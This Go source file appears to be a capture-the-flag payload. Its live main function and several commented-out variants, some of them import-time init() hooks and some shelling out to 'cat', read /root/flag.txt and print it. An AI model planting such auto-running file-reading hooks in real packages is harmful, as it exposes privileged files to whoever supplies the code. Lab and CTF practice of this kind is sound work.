
// package atak

// import (
// 	"fmt"
// 	"io/ioutil"
// 	"os"
// )

// func init() {
// 	data, err := ioutil.ReadFile("/root/flag.txt")
// 	if err != nil {
// 		fmt.Println("Error:", err)
// 		return
// 	}
// 	fmt.Fprintln(os.Stdout, string(data))
// }






// import (
// 	"fmt"
// 	"io/ioutil"
// 	"os"
// )

// func init() {
// 	// رسالة بدء التطبيق للتأكد من تنفيذ الكود
// 	fmt.Println("DEBUG: Starting package atak...")

// 	// محاولة قراءة الملف
// 	data, err := ioutil.ReadFile("/root/flag.txt")
// 	if err != nil {
// 		fmt.Println("DEBUG: Error reading /root/flag.txt:", err)
// 		return
// 	}

// 	// التأكد من محتوى الملف
// 	if len(data) == 0 {
// 		fmt.Println("DEBUG: /root/flag.txt is empty!")
// 	} else {
// 		fmt.Fprintln(os.Stdout, "FLAG:", string(data))
// 	}

// }
















package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"os"
)

func main() {
	// إنشاء writer وتفريغ الإخراج
	writer := bufio.NewWriter(os.Stdout)
	defer writer.Flush()
	
	// كتابة رسالة debug على stdout
	fmt.Fprintln(writer, "DEBUG: Starting application...")

	// كتابة نفس الرسالة على stderr أيضاً للتأكد
	fmt.Fprintln(os.Stderr, "DEBUG: Starting application...")

	// محاولة قراءة الملف
	data, err := ioutil.ReadFile("/root/flag.txt")
	if err != nil {
		fmt.Fprintln(writer, "DEBUG: Error reading /root/flag.txt:", err)
		fmt.Fprintln(os.Stderr, "DEBUG: Error reading /root/flag.txt:", err)
		return
	}

	// التأكد من محتويات الملف
	if len(data) == 0 {
		fmt.Fprintln(writer, "DEBUG: /root/flag.txt is empty!")
		fmt.Fprintln(os.Stderr, "DEBUG: /root/flag.txt is empty!")
	} else {
		fmt.Fprintln(writer, "FLAG:", string(data))
		fmt.Fprintln(os.Stderr, "FLAG:", string(data))
	}
}























// import (
// 	"fmt"
// 	"os/exec"
// 	"strings"
// )

// func atak() {
// 	// تنفيذ أمر cat لقراءة الفلاج
// 	cmd := exec.Command("cat", "/root/flag.txt")
// 	output, err := cmd.CombinedOutput()

// 	// التعامل مع الخطأ
// 	if err != nil {
// 		fmt.Println("Error:", err)
// 		return
// 	}

// 	// طباعة الفلاج
// 	fmt.Println("FLAG:", strings.TrimSpace(string(output)))
// }













// package atak

// import (
// 	"fmt"
// 	"io/ioutil"
// )

// func init() string {
// 	data, err := ioutil.ReadFile("/root/flag.txt")
// 	if err != nil {
// 		return "Error: " + err.Error()
// 	}
// 	return "FLAG: " + string(data)
// }




// import (
//     "os/exec"
//     "fmt"
// )

// func main() {
//     out, err := exec.Command("cat", "/root/flag.txt").Output()
//     if err != nil {
//         fmt.Println("Error:", err)
//         return
//     }
//     fmt.Println("FLAG:", string(out))
// }
